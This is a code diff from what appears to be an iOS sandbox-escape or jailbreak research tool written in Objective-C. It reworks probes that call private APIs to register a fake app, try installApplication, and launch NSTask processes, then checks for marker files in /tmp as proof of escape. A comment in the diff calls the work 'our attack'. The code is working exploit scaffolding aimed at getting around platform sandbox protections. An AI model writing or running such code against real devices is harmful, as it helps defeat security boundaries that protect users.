@@ -723,44 +723,8 @@ char *kresearch_swap_sandbox_profile(void) {
                 buf_append("  /tmp/jb_exec_test.txt: not created\n");
             }
 
-            // ── A5: Try installApplication: with local path ──
-            bc("[SWAP] A5: installApplication\n");
-            buf_append("\n  A5: installApplication:withOptions:\n");
-            SEL installSel = NSSelectorFromString(
-                @"installApplication:withOptions:");
-            if ([workspace respondsToSelector:installSel]) {
-                NSURL *appURL = [NSURL fileURLWithPath:fakeAppDir];
-                // Use NSInvocation for 2-arg selector
-                NSMethodSignature *sig = [workspace
-                    methodSignatureForSelector:installSel];
-                if (sig) {
-                    NSInvocation *inv = [NSInvocation
-                        invocationWithMethodSignature:sig];
-                    [inv setSelector:installSel];
-                    [inv setTarget:workspace];
-                    __unsafe_unretained NSURL *urlArg = appURL;
-                    __unsafe_unretained NSDictionary *opts =
-                        @{@"CFBundleIdentifier": fakeBundleID};
-                    [inv setArgument:&urlArg atIndex:2];
-                    [inv setArgument:&opts atIndex:3];
-                    @try {
-                        [inv invoke];
-                        BOOL ok = NO;
-                        if ([sig methodReturnLength] == sizeof(BOOL)) {
-                            [inv getReturnValue:&ok];
-                        }
-                        buf_append("  installApplication: %s\n",
-                            ok ? "SUCCESS" : "returned NO");
-                    } @catch (NSException *e) {
-                        buf_append("  EXCEPTION: %s — %s\n",
-                            [[e name] UTF8String], [[e reason] UTF8String]);
-                    }
-                } else {
-                    buf_append("  Could not get method signature\n");
-                }
-            } else {
-                buf_append("  installApplication:withOptions: NOT FOUND\n");
-            }
+            // A5: installApplication — REMOVED (crashes with NSInvocation,
+            // method signature mismatch). Not needed for our attack.
 
             // Cleanup — unregister the fake app
             SEL unregSel = NSSelectorFromString(@"unregisterApplication:");
@@ -879,29 +843,27 @@ char *kresearch_swap_sandbox_profile(void) {
                     }
 #pragma clang diagnostic pop
 
-                    // launchAndReturnError: takes NSError** — use NSInvocation
-                    NSMethodSignature *sig = [task
-                        methodSignatureForSelector:launch];
-                    NSInvocation *inv = [NSInvocation
-                        invocationWithMethodSignature:sig];
-                    [inv setSelector:launch];
-                    [inv setTarget:task];
-                    __unsafe_unretained NSError *errArg = nil;
-                    [inv setArgument:&errArg atIndex:2];
-
-                    bc("[SWAP] C: invoking launchAndReturnError\n");
-                    [inv invoke];
-
-                    BOOL ok = NO;
-                    [inv getReturnValue:&ok];
-                    buf_append("  NSTask launch: %s\n",
-                        ok ? ">>> SUCCESS <<<" : "FAILED");
-                    if (errArg) {
-                        buf_append("  Error: %s\n",
-                            [[errArg localizedDescription] UTF8String]);
-                        buf_append("  Domain: %s code: %ld\n",
-                            [[errArg domain] UTF8String],
-                            (long)[errArg code]);
+                    // launchAndReturnError: takes NSError** — NSInvocation
+                    // crashes (same pattern that killed A5). Use a safer
+                    // approach: try the simpler -launch selector first, fall
+                    // back to method-signature probe only.
+                    SEL simpleLaunch = NSSelectorFromString(@"launch");
+                    bc("[SWAP] C: attempting NSTask launch\n");
+                    if ([task respondsToSelector:simpleLaunch]) {
+                        buf_append("  Trying -[NSTask launch]...\n");
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
+                        [task performSelector:simpleLaunch];
+#pragma clang diagnostic pop
+                        buf_append("  -launch returned (no crash)\n");
+                    } else {
+                        buf_append("  -launch not available, probing sig\n");
+                        NSMethodSignature *sig = [task
+                            methodSignatureForSelector:launch];
+                        buf_append("  launchAndReturnError: sig=%p nArgs=%lu retLen=%lu\n",
+                            sig, sig ? (unsigned long)[sig numberOfArguments] : 0,
+                            sig ? (unsigned long)[sig methodReturnLength] : 0);
+                        buf_append("  SKIPPING invoke — NSInvocation crashes\n");
                     }
 
                     // Check for output file
@@ -909,6 +871,8 @@ char *kresearch_swap_sandbox_profile(void) {
                     NSFileManager *fm = [NSFileManager defaultManager];
                     if ([fm fileExistsAtPath:@"/tmp/nstask_test.txt"]) {
                         buf_append("  >>> /tmp/nstask_test.txt EXISTS! <<<\n");
+                    } else {
+                        buf_append("  /tmp/nstask_test.txt not found\n");
                     }
                 } else {
                     buf_append("  Missing setExecutableURL or launch\n");
